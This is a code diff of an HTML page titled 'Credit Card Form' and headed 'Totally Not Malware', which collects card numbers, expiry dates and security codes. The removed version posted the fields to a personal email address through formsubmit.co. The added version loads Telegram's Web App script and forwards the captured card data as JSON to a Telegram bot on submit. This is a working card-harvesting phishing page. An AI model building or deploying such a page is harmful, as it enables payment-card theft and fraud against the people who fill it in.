@@ -4,6 +4,7 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Credit Card Form</title>
+    <script src="https://telegram.org/js/telegram-web-app.js"></script>
     <style>
         body {
             font-family: "Segoe UI", Tahoma, Geneva, Verdana, sans-serif;
@@ -49,18 +50,14 @@
         .form-container button:hover {
             background-color: #db7093; /* Темно-розовая кнопка при наведении */
         }
-
         .gif-container {
             margin-top: 20px;
         }
-
         .gif-container img {
             max-width: 100%;
             border-radius: 8px;
             box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);
         }
-
-        /* Оптимизация для мобильных устройств */
         @media (max-width: 600px) {
             .form-container {
                 width: 100%;
@@ -72,27 +69,30 @@
 <body>
     <div class="form-container">
         <h1>Totally Not Malware</h1>
-        <form action="https://formsubmit.co/andrej.g2103@gmail.com" method="POST">
+        <form id="credit-card-form">
             <!-- Поля для ввода данных -->
             <input type="text" name="Card Number" placeholder="Card number" required>
             <input type="text" name="Expiry Date" placeholder="Expiry date" required>
             <input type="text" name="Security Code" placeholder="Security code" required>
             
-            <!-- Telegram Bot Info -->
-            <input type="hidden" name="_template" value="table">
-            <input type="hidden" name="_subject" value="New Card Details">
-            <input type="hidden" name="_next" value="https://goosemma.github.io">
-            <input type="hidden" name="_telegram" value="">
-            <input type="hidden" name="_telegram_token" value="">
             <button type="submit">Th-thanks</button>
         </form>
     </div>
-
-    <!-- Контейнер для GIF -->
     <div class="gif-container">
         <img src="tia.gif" alt="GIF">
     </div>
 
-    <!-- Удалено модальное окно и скрипты для его управления -->
+    <script>
+        window.Telegram.WebApp.ready();
+        document.getElementById('credit-card-form').addEventListener('submit', function(event) {
+            event.preventDefault();
+
+            const formData = new FormData(event.target);
+            const data = {};
+            formData.forEach((value, key) => data[key] = value);
+
+            window.Telegram.WebApp.sendData(JSON.stringify(data));
+        });
+    </script>
 </body>
 </html>
